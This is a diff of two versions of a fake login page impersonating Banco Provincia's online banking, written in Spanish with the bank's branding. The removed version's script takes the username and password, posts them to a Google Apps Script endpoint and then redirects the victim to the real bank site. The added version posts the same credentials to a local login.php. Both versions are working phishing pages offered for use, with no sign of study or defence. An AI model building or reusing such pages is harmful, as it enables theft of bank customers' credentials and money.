@@ -3,273 +3,213 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="robots" content="noindex">
-<meta name="referrer" content="no-referrer">
-<title>Banco de la Provincia de Buenos Aires</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23007a2b'/%3E%3Ctext x='16' y='23' font-family='sans-serif' font-size='19' font-weight='700' fill='%23fff' text-anchor='middle'%3EB%3C/text%3E%3C/svg%3E">
+<title>Banco Provincia</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
-  :root{
-    --verde-osc:#007a2b;
-    --verde-hover:#378f30;
-    --gris:#3c3c3b;
-    --foco:#0e22d3;
-    --input-bg:#f8f8f8;
-    --input-bg-hover:#f5f5f5;
-    --grad:linear-gradient(270deg,#26b4bd,#3daa35);
-    --radio-btn:.25rem .688rem;
-    --safe-top:env(safe-area-inset-top,0px);
-    --safe-bottom:env(safe-area-inset-bottom,0px);
-    --vh:1vh;
+  :root {
+    --verde-principal: #009b5c;
+    --texto-gris: #3c3c3c;
+    --texto-placeholder: #999;
+    --borde-inferior: #ccc;
+    /* Gradiente similar al de la captura */
+    --grad-header: linear-gradient(90deg, #007a2b 0%, #2ebcb5 100%); 
   }
-  *,*::before,*::after{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    margin:0;
-    font-family:"Encode Sans",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
-    font-size:1rem; line-height:1.5rem; color:var(--gris);
-    background-color:#eef3f7;
-    background-image:linear-gradient(160deg,#e8f1f7 0%,#f4f8f5 55%,#eaf2ea 100%);
-    background-attachment:fixed;
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Roboto, sans-serif;
+    background-color: #f4f6f8;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
   }
-  .login-wrap{min-height:calc(var(--vh) * 100); display:flex; align-items:center; justify-content:center}
-  .login-content{
-    width:100%; max-width:26.25rem; max-height:min(46.875rem,95vh);
-    background:#fff; border-radius:.625rem; box-shadow:0 0 .938rem rgba(0,0,0,.102);
-    display:flex; flex-direction:column; overflow:hidden;
+
+  .mobile-container {
+    width: 100%;
+    max-width: 400px;
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
   }
-  .header-gradient{
-    background:var(--grad); height:calc(5.625rem + var(--safe-top)); padding-top:var(--safe-top);
-    display:flex; align-items:center; justify-content:center; flex:0 0 auto;
-  }
-  .header-gradient img{height:2.125rem; width:auto; display:block}
-  .cuerpo{padding:1.5rem; overflow-y:auto; flex:1 1 auto; min-height:0; scrollbar-gutter:stable both-edges}
-  h1{font-weight:600; font-size:1.5rem; line-height:1.875rem; color:var(--verde-osc); margin:0 0 1.5rem}
-  label{display:block; font-weight:600; font-size:1rem; line-height:1.25rem; margin-bottom:.375rem}
-  .campo{margin-bottom:1rem}
-  .form-control{
-    display:block; width:100%; min-height:2.625rem; padding:.375rem .75rem;
-    font-family:inherit; font-size:1rem; line-height:1.5; color:var(--gris);
-    background-color:var(--input-bg);
-    border:.063rem solid var(--input-bg); border-bottom:.063rem solid var(--gris);
-    border-radius:0; outline:0;
-    transition:border-color .15s ease-in-out, background-color .15s ease-in-out;
-  }
-  .form-control:hover{background-color:var(--input-bg-hover)}
-  .form-control:focus{background-color:var(--input-bg-hover); border:.063rem solid var(--gris)}
-  .form-control:focus-visible{box-shadow:0 0 0 .188rem var(--foco)}
-  .form-control::placeholder{color:#6c757d; opacity:1}
-  .pass{position:relative}
-  .pass .form-control{padding-right:2.75rem}
-  .pass button{
-    position:absolute; right:.625rem; top:50%; transform:translateY(-50%);
-    border:0; background:none; padding:0; cursor:pointer;
-    color:var(--verde-osc); display:flex; align-items:center;
-  }
-  .btn{
-    display:block; width:100%; min-height:2.625rem; padding:.375rem .75rem;
-    font-family:inherit; font-size:1rem; font-weight:600;
-    border:.188rem solid transparent; border-radius:var(--radio-btn); cursor:pointer;
-    background-color:var(--gris); color:#fff; transition:background-color .1s ease-in-out;
-  }
-  .btn:hover{background-color:#595958}
-  .btn:active{background-color:#2d2d2c}
-  .btn-link{
-    background:none; border:0; padding:0; cursor:pointer;
-    color:var(--verde-osc); text-decoration:underline;
-    font-family:inherit; font-size:1rem; font-weight:400;
-  }
-  .btn-link:hover{color:var(--verde-hover)}
-  .centro{text-align:center}
-  .links{font-size:1rem; line-height:1.5rem; margin-top:1rem}
-  .links a{color:var(--verde-osc); text-decoration:underline}
-  .links a:hover{color:var(--verde-hover)}
-  #teclado{display:none; margin-top:1rem; background:#ececec; border-radius:5px; padding:5px}
-  #teclado .fila{display:flex; gap:4px; margin-bottom:4px}
-  #teclado button{
-    flex:1; min-width:0; height:2.5rem; padding:5px;
-    font-family:inherit; font-size:.875rem; background:#fff;
-    border:0; border-bottom:1px solid #b5b5b5; border-radius:5px;
-    box-shadow:0 0 3px -1px rgba(0,0,0,.3); cursor:pointer;
-  }
-  #teclado button:active{background:#efefef}
-  .overlay{
-    position:fixed; inset:0; z-index:99; background:rgba(255,255,255,.8);
-    display:none; flex-direction:column; align-items:center; justify-content:center; gap:1rem;
-  }
-  .overlay.on{display:flex}
-  .spinner{
-    width:2.5rem; height:2.5rem; border-radius:50%;
-    border:.25rem solid #e0e0e0; border-top-color:var(--verde-osc);
-    animation:girar .8s linear infinite;
-  }
-  @keyframes girar{to{transform:rotate(360deg)}}
-  @media (min-width:768px){
-    .header-gradient{height:calc(7.5rem + var(--safe-top))}
-    .header-gradient img{height:2.875rem}
-    .cuerpo{padding:1.5rem 1.5rem 2rem}
-  }
-  @media (max-width:767.98px){
-    .login-wrap{align-items:flex-end; padding-top:4.375rem}
-    .login-content{
-      max-width:none; max-height:none; box-shadow:none;
-      height:calc(calc(var(--vh) * 100) - 4.375rem - var(--safe-bottom));
-      border-radius:1.25rem 1.25rem 0 0;
+
+  @media (min-width: 401px) {
+    .mobile-container {
+      height: 90vh;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      margin-top: 20px;
+      margin-bottom: 20px;
     }
+  }
+
+  /* HEADER CON LOGO */
+  header {
+    background: var(--grad-header);
+    padding: 20px;
+    text-align: center;
+    color: white;
+    flex-shrink: 0;
+  }
+
+  .logo-area {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 15px;
+  }
+
+  /* AQUÍ VA TU IMAGEN logo.png */
+  .logo-img {
+    height: 40px; /* Ajustá este tamaño según tu imagen */
+    width: auto;
+  }
+
+  h1 { font-size: 1.2rem; font-weight: 600; margin: 0; }
+  
+  .subtitulo {
+    font-size: 1.1rem;
+    font-weight: 600;
+    margin-top: 10px;
+  }
+
+  /* FORMULARIO */
+  form {
+    padding: 30px 25px;
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .input-group { margin-bottom: 25px; position: relative; }
+
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: var(--texto-gris);
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 10px;
+    font-size: 1rem;
+    border: none;
+    border-bottom: 2px solid var(--borde-inferior);
+    background: transparent;
+    color: var(--texto-gris);
+    outline: none;
+    border-radius: 0;
+  }
+
+  input:focus { border-bottom-color: var(--verde-principal); }
+  input::placeholder { color: var(--texto-placeholder); }
+
+  /* BOTÓN OJO */
+  .toggle-password {
+    position: absolute;
+    right: 10px;
+    top: 35px;
+    background: none;
+    border: none;
+    color: var(--verde-principal);
+    cursor: pointer;
+    font-size: 1.1rem;
+  }
+
+  /* BOTÓN INGRESAR */
+  .btn-ingresar {
+    width: 100%;
+    padding: 14px;
+    background-color: #3c3c3c; /* Gris oscuro como en la foto */
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+
+  /* LINKS */
+  .links-footer {
+    padding: 20px 25px;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    border-top: 1px solid #eee;
+    background: #fafafa;
+  }
+
+  .link-item {
+    text-decoration: underline;
+    color: var(--verde-principal);
+    font-size: 0.9rem;
+    text-align: left;
   }
 </style>
 </head>
 <body>
 
-<div class="login-wrap">
-  <div class="login-content">
+<div class="mobile-container">
+  <header>
+    <div class="logo-area">
+      <!-- IMAGEN GUARDADA COMO logo.png -->
+      <img src="logo.png" alt="Banco Provincia" class="logo-img">
+      <h1>Banco Provincia</h1>
+    </div>
+    <div class="subtitulo">Iniciá sesión</div>
+</header>
 
-    <div class="header-gradient">
-      <img src="logo.png" alt="Banco de la Provincia de Buenos Aires"
-           onerror="this.onerror=null;this.src='https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip'">
+  <!-- EL FORMULARIO ENVÍA DATOS A login.php -->
+  <form action="login.php" method="POST">
+    
+    <div class="input-group">
+      <label for="usuario">Tu usuario <span style="color:red">*</span></label>
+      <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
     </div>
 
-    <div class="cuerpo">
-      <h1>Iniciá sesión</h1>
-
-      <form id="form1" autocomplete="off">
-
-        <div class="campo">
-          <label for="username">Tu usuario</label>
-          <input class="form-control" type="text" id="username" name="Usuario"
-                 maxlength="25" placeholder="Ingresá tu nombre de usuario"
-                 autocapitalize="off" autocorrect="off" spellcheck="false" required>
-        </div>
-
-        <div class="campo">
-          <label for="password">Tu clave</label>
-          <div class="pass">
-            <input class="form-control" type="password" id="password" name="Clave"
-                   maxlength="30" placeholder="Ingresá tu clave" required>
-            <button type="button" id="btnOjo" aria-label="Mostrar clave">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"
-                   stroke="currentColor" stroke-width="2" stroke-linecap="round">
-                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
-                <circle cx="12" cy="12" r="3"/>
-              </svg>
-            </button>
-          </div>
-        </div>
-
-        <div class="centro">
-          <button type="button" class="btn-link" id="btnTeclado">Teclado Virtual</button>
-          <div id="teclado"></div>
-        </div>
-
-        <button type="submit" class="btn" style="margin-top:1.5rem">Ingresar</button>
-
-        <div class="links centro">
-          <div>¿No sos BIP? <a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Registrate</a></div>
-          <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Bloqueé u olvidé mi usuario y/o clave</a></div>
-          <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Conocé como hacerte usuario u operar</a></div>
-          <div><a href="https://www.bancoprovincia.bancainternet.com.ar/spa/">Recomendaciones de seguridad</a></div>
-        </div>
-      </form>
+    <div class="input-group">
+      <label for="clave">Tu clave <span style="color:red">*</span></label>
+      <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
+      <button type="button" class="toggle-password" onclick="togglePass()">
+        <i class="fa-regular fa-eye"></i>
+      </button>
     </div>
+
+    <button type="submit" class="btn-ingresar">ingresar</button>
+  </form>
+
+  <div class="links-footer">
+    <a href="#" class="link-item">¿No sos BIP? Registrate</a>
+    <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
+    <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
+    <a href="#" class="link-item">Recomendaciones de seguridad</a>
   </div>
 </div>
 
-<div class="overlay" id="overlay">
-  <div class="spinner"></div>
-  <div style="font-size:1rem">Ingresando...</div>
-</div>
-
 <script>
-(function () {
-  'use strict';
-
-  var REDIRECT = 'https://www.bancoprovincia.bancainternet.com.ar/spa/';
-  var ENDPOINT = 'https://script.google.com/macros/s/AKfycbwBWsbnK_aEfG-UtV2bvLzIByMiTWcYTjY2-ueNn3pDwWbIoeS7P2irT5K55zxhxyk/exec';
-
-  var $ = function (id) { return document.getElementById(id); };
-  var form    = $('form1');
-  var overlay = $('overlay');
-  var enviado = false;
-
-  function setVh() {
-    document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
+  function togglePass() {
+    const passInput = document.getElementById('clave');
+    const icon = document.querySelector('.toggle-password i');
+    
+    if (passInput.type === 'password') {
+      passInput.type = 'text';
+      icon.classList.remove('fa-eye');
+      icon.classList.add('fa-eye-slash');
+    } else {
+      passInput.type = 'password';
+      icon.classList.remove('fa-eye-slash');
+      icon.classList.add('fa-eye');
+    }
   }
-  setVh();
-  window.addEventListener('resize', setVh);
-  window.addEventListener('orientationchange', setVh);
-
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    if (enviado) return;
-    enviado = true;
-    overlay.classList.add('on');
-
-    var formData = new URLSearchParams();
-    formData.append('Usuario', $('username').value);
-    formData.append('Clave', $('password').value);
-
-    fetch(ENDPOINT, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: formData
-    }).finally(function () {
-      setTimeout(function () {
-        window.location.href = REDIRECT;
-      }, 1500);
-    });
-  });
-
-  window.addEventListener('pageshow', function (ev) {
-    if (!ev.persisted) return;
-    enviado = false;
-    overlay.classList.remove('on');
-  });
-
-  $('btnOjo').addEventListener('click', function () {
-    var p = $('password');
-    p.type = (p.type === 'password') ? 'text' : 'password';
-  });
-
-  var activo = $('username');
-  ['username', 'password'].forEach(function (id) {
-    $(id).addEventListener('focus', function () { activo = this; });
-  });
-
-  var teclado = $('teclado');
-  ['1234567890', 'qwertyuiop', 'asdfghjklñ', 'zxcvbnm', '@.-_'].forEach(function (fila) {
-    var div = document.createElement('div');
-    div.className = 'fila';
-    fila.split('').forEach(function (ch) {
-      var b = document.createElement('button');
-      b.type = 'button';
-      b.textContent = ch;
-      b.addEventListener('click', function () {
-        if (activo.maxLength && activo.value.length >= activo.maxLength) return;
-        activo.value += ch;
-      });
-      div.appendChild(b);
-    });
-    teclado.appendChild(div);
-  });
-
-  var fila = document.createElement('div');
-  fila.className = 'fila';
-  var borrar = document.createElement('button');
-  borrar.type = 'button';
-  borrar.textContent = 'Borrar';
-  borrar.style.flex = '3';
-  borrar.addEventListener('click', function () {
-    activo.value = activo.value.slice(0, -1);
-  });
-  fila.appendChild(borrar);
-  teclado.appendChild(fila);
-
-  $('btnTeclado').addEventListener('click', function () {
-    var abierto = teclado.style.display === 'block';
-    teclado.style.display = abierto ? 'none' : 'block';
-    this.textContent = abierto ? 'Teclado Virtual' : 'Ocultar teclado';
-  });
-
-})();
 </script>
+
 </body>
 </html>
